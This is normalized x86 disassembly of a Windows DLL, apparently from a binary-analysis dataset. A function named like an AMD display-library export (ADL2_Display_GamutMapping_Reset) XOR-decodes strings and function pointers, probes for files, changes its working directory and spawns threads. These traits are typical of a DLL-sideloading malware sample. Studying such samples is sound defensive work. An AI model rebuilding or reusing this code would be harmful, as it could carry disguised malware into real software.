lea eax [ ebp - 0xbc ]
push eax
push r--data
lea eax [ ebp - 0x4c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xbc ]
jns r-xdata
lea edx [ ebp - 0xac ]
xor esi esi
mov [ ebp - 0xac ] esi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp eax esi
jge r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov ebx [ VarBstrFromUI4@IAT ]
lea ecx [ ebp - 0xb8 ]
push ecx
push esi
push 0x80000000
push eax
mov [ ebp - 0xb8 ] esi
call ebx
cmp [ ebp - 0xb8 ] esi
jne r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x120
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xd4
call sub_100050e0
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
mov eax 0x20
call sub_100050e0
mov ecx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb8 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ecx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb8 ] eax
call sub_100050e0
mov edx [ ebp - 0xb8 ]
push edx
call [ SysFreeString@IAT ]
mov eax [ edi + 0x14 ]
lea ecx [ ebp - 0xb0 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb0 ] 0x0
call ebx
cmp [ ebp - 0xb0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0xb4
call sub_100050e0
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x30 ]
mov eax 0x104
call sub_100050e0
mov ebx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x3c ]
mov eax 0xda
call sub_100050e0
mov esi [ edi + 0x4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x28
call sub_100050e0
mov eax [ edi + 0x8 ]
lea ecx [ ebp - 0xb4 ]
push ecx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xb4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xb4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xbc
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x121
call sub_100050e0
mov esi [ ebp - 0xb4 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp - 0xb4 ]
push ecx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0x1c ]
mov eax 0x8d
call sub_100050e0
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0xeb
call sub_100050e0
mov ecx [ ebp - 0xc8 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xc0 ]
push ecx
mov ecx [ ebp - 0xbc ]
push ecx
push eax
call edx
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x12c
jmp r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x98
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xac ]
test eax eax
je r-xdata
sub_10006560
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_1002c5ed
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_10016d10
test edi edi
je r-xdata
cmp edi 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov cl [ ebp + 0xc ]
mov eax esi
mov [ eax ] cl
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
movsx edx [ ebp + 0xc ]
push edi
push edx
push eax
call sub_10079a10
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1000661e
push 0x10
mov eax sub_1007ffbb
call sub_100097c8
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1003cdcb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_10069ce0
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004db01
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_1003088d
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ebx [ ebp - 0x14 ]
mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_10006760
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x47
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x29
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x58 ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x26
call sub_100429d0
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
ADL2_Display_GamutMapping_Reset
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10083a80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x588
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x580 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x598 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
lea edx [ esp + 0x34 ]
mov [ esp + 0x10 ] ecx
push edx
mov ecx ebx
mov [ esp + 0x18 ] eax
call sub_10046830
xor eax eax
mov [ esp + 0x5a0 ] eax
cmp [ esp + 0x70 ] eax
je r-xdata
cmp [ rw-data ] eax
je r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov esi [ r--data ]
xor cl cl
call sub_10062830
test eax eax
je r-xdata
mov [ rw-data ] eax
mov dl [ esi + eax ]
xor dl cl
xor dl 0x72
inc cl
mov [ esp + eax + 0xd4 ] dl
movzx eax cl
cmp eax 0x1f
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ esp + 0xf3 ] 0x0
xor eax eax
nop
mov eax [ esp + 0x60 ]
push r--data
xor edi edi
lea ecx [ esp + 0x54 ]
call sub_10039b60
lea ebx [ edi + 0x8 ]
test eax eax
je r-xdata
mov esi 0x8
cmp [ esp + 0x64 ] esi
jb r-xdata
mov dl [ esi + eax ]
xor dl cl
xor dl 0x36
inc cl
mov [ esp + eax + 0xcc ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov edi 0xf
xor esi esi
mov eax ebx
mov [ esp + 0xd2 ] 0x0
mov [ esp + 0x2c ] edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax [ esp + 0x44 ]
push r--data
xor edi edi
lea ecx [ esp + 0x38 ]
call sub_10039b60
test eax eax
je r-xdata
mov eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] ebx
jae r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] esi
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
lea ecx [ esp + 0x20 ]
call sub_10043190
mov [ esp + 0x5a0 ] 0x1
lea eax [ esp + 0xcc ]
mov [ esp + 0xa8 ] edi
mov [ esp + 0xa4 ] esi
mov [ esp + 0x94 ] 0x0
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xffffffff
push edi
lea edx [ esp + 0x3c ]
push edx
mov ecx rw-data
call sub_10019180
push eax
call sub_10025d80
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x50 ]
mov ecx [ esp + 0x598 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x580 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea eax [ esp + 0xd0 ]
push eax
lea ecx [ esp + 0x9c ]
call sub_10043190
lea ecx [ esp + 0x94 ]
push ecx
lea edx [ esp + 0x7c ]
push r--data
push edx
mov [ esp + 0x5ac ] 0x2
call sub_10021390
add esp 0xc
push eax
mov edx r--data
lea esi [ esp + 0xb4 ]
mov [ esp + 0x5a4 ] 0x3
call sub_100150a0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5ac ] 0x4
call sub_10035d20
mov ebx 0x10
cmp [ esp + 0xc4 ] ebx
jb r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
mov edi [ GetModuleFileNameW@IAT ]
push 0x104
lea ecx [ esp + 0xf8 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
call sub_1006591f
add esp 0x4
xor esi esi
mov [ esp + 0xc4 ] edi
mov [ esp + 0xc0 ] esi
mov [ esp + 0xb0 ] 0x0
cmp [ esp + 0x8c ] ebx
jb r-xdata
mov eax [ esp + 0xb0 ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] ebx
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_1006591f
add esp 0x4
lea edx [ esp + 0xf4 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ esp + 0xf4 ]
push eax
call [ PathAddBackslashW@IAT ]
lea ecx [ esp + 0xf4 ]
push ecx
call [ SetCurrentDirectoryW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] edi
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] ebx
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_1006591f
add esp 0x4
mov [ esp + 0x5a0 ] 0x1
mov [ esp + 0x8c ] edi
mov [ esp + 0x88 ] esi
mov [ esp + 0x78 ] 0x0
cmp [ esp + 0xa8 ] ebx
jb r-xdata
mov ecx [ esp + 0x78 ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
call sub_10025840
test eax eax
jne r-xdata
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
xor esi esi
xor edi edi
jmp r-xdata
mov edx [ esp + 0x94 ]
push edx
call sub_1006591f
add esp 0x4
call sub_10023d60
push 0xdc8
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0xd4 ]
push eax
lea edx [ edi + ecx ]
push edx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
xor eax eax
push rw-data
mov esi eax
call sub_1000af60
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
xor edi edi
cmp ecx edi
je r-xdata
add edi 0x108
inc esi
cmp edi 0x6720
jl r-xdata
call sub_1001e0f0
test al al
je r-xdata
lea edx [ esp + 0x2fc ]
mov eax 0xde
call sub_10013830
jmp r-xdata
mov [ rw-data ] eax
call sub_10051070
call sub_1005f650
call sub_1003f960
test eax eax
je r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
mov [ esp + 0x5a0 ] 0x0
cmp [ esp + 0x2c ] ebx
jb r-xdata
call sub_1004d770
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov ecx [ ebp + 0x14 ]
mov edx [ rw-data ]
push ecx
push eax
push edx
jmp r-xdata
lea eax [ esp + 0x18 ]
mov edx [ ebp + 0x14 ]
push edx
push eax
push ecx
lea eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
push ecx
call sub_1006591f
add esp 0x4
call sub_10037330
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov eax [ esp + 0x20 ]
imul esi esi 0x108
mov ecx [ rw-data ]
mov edx [ esi + ecx + 0x104 ]
push eax
call edx
cmp [ esp + 0x2c ] ebx
jb r-xdata
mov esi 0x8
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] 0xf
cmp [ esp + 0x64 ] esi
jb r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_1006591f
add esp 0x4
call sub_1003b810
push 0x104
lea eax [ esp + 0x388 ]
push eax
push 0x0
call edi
test eax eax
je r-xdata
call sub_10034260
mov edx [ rw-data ]
test eax eax
je r-xdata
xor edx edx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] edi
mov [ esp + 0x50 ] dx
cmp [ esp + 0x48 ] esi
jb r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_1006591f
add esp 0x4
mov edx [ rw-data ]
push 0x104
lea ecx [ esp + 0xf8 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
push eax
call [ ReleaseMutex@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov al 0x38
mov [ esp + 0x10 ] ecx
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
push edx
call [ esp + 0x14 ]
push edx
call [ ReleaseMutex@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x10 ] eax
mov al 0x38
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
push ecx
call [ esp + 0x14 ]
jmp r-xdata
mov eax [ esp + 0x34 ]
push eax
mov eax [ rw-data ]
push eax
call sub_100656a0
push rw-data
push rw-data
push eax
mov edx rw-data
mov ebx rw-data
lea esi [ esp + 0x100 ]
lea ecx [ esp + 0x390 ]
call sub_10020fd0
add esp 0xc
push 0x138
mov [ esp + 0x18 ] eax
call sub_10055606
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x5a0 ] 0x5
test eax eax
je r-xdata
xor edx edx
cmp [ rw-data ] 0x8
mov ecx [ rw-data ]
jae r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
push rw-data
push rw-data
push ecx
mov edx rw-data
mov ecx rw-data
mov edi eax
call sub_10026e50
mov edx eax
jmp r-xdata
mov ecx rw-data
inc edi
add esi 0x208
cmp edi 0x1e
jb r-xdata
mov eax esi
lea edx [ eax + 0x2 ]
mov [ esp + 0x5a0 ] 0x0
fld [ rw-data ]
push ecx
fstp [ esp ]
mov [ rw-data ] edx
call sub_10050300
fld [ rw-data ]
push ecx
fstp [ esp ]
call sub_10005000
mov edx [ edx + 0x110 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
xor edi edi
mov esi rw-data
lea eax [ esi - 0x3e1c ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
call sub_10031a30
mov ecx [ rw-data ]
mov eax [ ecx + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
call sub_10034ba0
push 0x0
push 0x0
push 0x0
push sub_10004ab0
push 0x0
push 0x0
call sub_1002f01f
mov edx [ rw-data ]
mov cl 0x38
mov [ esp + 0x28 ] edx
xor [ esp + 0x28 ] cl
xor [ esp + 0x29 ] cl
xor [ esp + 0x2a ] cl
xor [ esp + 0x2b ] cl
add esp 0x18
push eax
call [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x7c ]
call sub_1001be10
add esp 0x4
mov [ esp + 0x5a0 ] 0x6
mov eax [ esp + 0x88 ]
test eax eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
call sub_10031420
test eax eax
je r-xdata
cmp [ esp + 0x8c ] 0x10
mov ecx [ esp + 0x78 ]
jae r-xdata
lea edx [ esi + 0x3cf0 ]
mov eax edx
lea ebx [ eax + 0x2 ]
call sub_100504b0
lea ecx [ esp + 0x78 ]
call sub_10061060
mov ebx 0x8
push 0x0
push eax
push ecx
mov ecx [ rw-data ]
push ecx
xor edx edx
xor ecx ecx
call sub_10009050
lea ecx [ esp + 0x78 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
je r-xdata
movzx eax [ edi * 2 + rw-data ]
test ax ax
je r-xdata
mov ecx [ edi * 4 + rw-data ]
push ecx
mov ecx [ edi * 4 + rw-data ]
push ecx
movzx ecx [ edi + rw-data ]
push ecx
push eax
lea eax [ esi - 0x3e1c ]
push eax
lea eax [ esi - 0x7b0c ]
push eax
mov ecx esi
call sub_10054e60
sub_10007058
push 0x38
mov eax sub_1007f941
call sub_1001bb6b
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10059065
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10069ce0
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1004fa89
retn 0x20
sub_1000710e
push 0x10
mov eax sub_1007f2ac
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100014b7
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xc ] ebx
ja r-xdata
mov ecx [ ebp + 0xc ]
call sub_10030d90
mov eax [ esi + 0x8 ]
mov edi ebx
cmp [ eax + edi * 4 ] 0x0
je r-xdata
lea edi [ ebx + 0x1 ]
cmp edi 0x28
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax + edi * 4 ] ecx
lea ecx [ ebp - 0x10 ]
call sub_10050f50
call sub_1004db01
retn
mov ecx [ eax + edi * 4 ]
call sub_1005aab0
test eax eax
je r-xdata
mov eax edi
shl eax 0x2
push eax
push [ esi + 0x8 ]
call sub_1005ebf2
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x28
pop edi
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov [ esi + 0x8 ] eax
jmp r-xdata
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
cmp [ esi + 0xc ] edi
jb r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_1003c66c
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_1000bd19
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov [ ebp + 0x8 ] r--data
call sub_1003f5b8
push sub_1008446a
mov [ rw-data ] esi
call sub_100662c2
pop ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax * 4 ] 0x0
inc [ esi + 0xc ]
sub_10007208
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_1002b48f
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10010183
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10031eac
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_100073b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1004a589
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003c6eb
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1003fe0d
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
